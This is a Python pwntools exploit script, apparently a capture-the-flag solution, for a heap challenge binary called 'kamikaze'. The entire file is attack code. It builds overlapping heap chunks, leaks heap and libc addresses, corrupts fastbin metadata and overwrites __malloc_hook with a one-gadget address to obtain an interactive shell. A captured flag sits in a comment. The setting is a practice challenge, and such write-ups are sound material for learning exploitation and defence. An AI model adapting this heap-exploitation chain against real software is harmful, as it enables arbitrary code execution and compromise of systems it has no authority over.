from pwn import *
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
def alloc(weight, size, stanza, hook):
	r.sendlineafter('>> ', '1')
	r.sendlineafter('song: ', str(weight))
	r.sendlineafter('stanza: ', str(size))
	r.sendlineafter('stanza: ', stanza)
	r.sendlineafter('too: ', hook)

def edit(weight, stanza):
	r.sendlineafter('>> ', '2')
	r.sendlineafter('weight: ', str(weight))
	r.sendafter('stanza: ', stanza)

def kamikaze(weight, seed):
	r.sendlineafter('>> ', '3')
	r.sendafter('weight: ', str(weight))
	r.sendlineafter('seed: ', str(seed))

def free(weight):
	r.sendlineafter('>> ', '4')
	r.sendlineafter('weight: ', str(weight))

def _print(idx):
	r.sendlineafter('>> ', '5')
	r.sendlineafter('index: ', str(idx))

def leak():
	_print(5)
	r.recvuntil('Weight: ')
	return int(r.recvline().strip(), 16)

def pwn():

	alloc(1, 0x28, '1', 'A'*0x18) 
	alloc(2, 0x28, '2', 'B'*0x18) 
	alloc(3, 0x28, '3', 'C'*0x18)
	
	free(2)
	free(3)
	free(1)
	alloc(4, 0x48, p64(0xb00bface), 'D'*0x18)
	alloc(5, 0x68, p64(0xcafebabe) + p64(0x31)*7, 'E'*0x18)

	kamikaze(5, 3)

	alloc(6, 0x28, p64(0xdeadbeef), 'F'*0x18)
	
	alloc(7, 0x28, p64(0xc0c01473), 'G'*0x18)
	
	kamikaze(5, 3)
	
	

	free(6)
	heap = leak() - 0xf0
	#victim = heap + 0x280
	log.success('Heap: 0x{:x}'.format(heap))

	free(5)
	

	# so far so good
	
	alloc(8, 0x28, 'Z'*0x10 + p64(0), 'H'*0x18)
	
	# there is a victim chunk at heap + 0xc0 which will be interpreted
	# as a song's metadata as well as a stanza
	edit(8, 'X'*8 + p64(heap + 0xc8) + p64(heap + 0x40))
	edit(0x5858585858585858, p8(0xf1))
	
	free(8)
	elf = ELF('./kamikaze')
	libc = elf.libc
	libc.address = leak() - 0x3c4b78
	

	log.success('Libc: 0x{:x}'.format(libc.address))
	gdb.attach(r)
	alloc(9, 0x38, p64(0xbabecafe) + p64(0) + p64(heap + 0x150) + p64(0x32)*3 + p64(0), 'I'*0x18)
	
	
	alloc(10, 0x18, p64(0xfaceb00b), 'J'*0x18)
	
	alloc(11, 0x48, p64(0)*3 + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x30 + 0xd), 'K'*0x18)
	
	alloc(12, 0x68, p64(0xfaceb00b), 'L'*0x18)
	
	alloc(13, 0x68, 'A'*0x13 + p64(libc.address + 0xf02a4), 'M'*0x18)
	r.sendline("1")
	r.sendline("1")
	# flag{D0n1_4lw4ys_trU5t_CALLOC_1ts_w3ird_lol}
	r.interactive()


if __name__ == "__main__":
	r = process('./kamikaze')
	pwn()
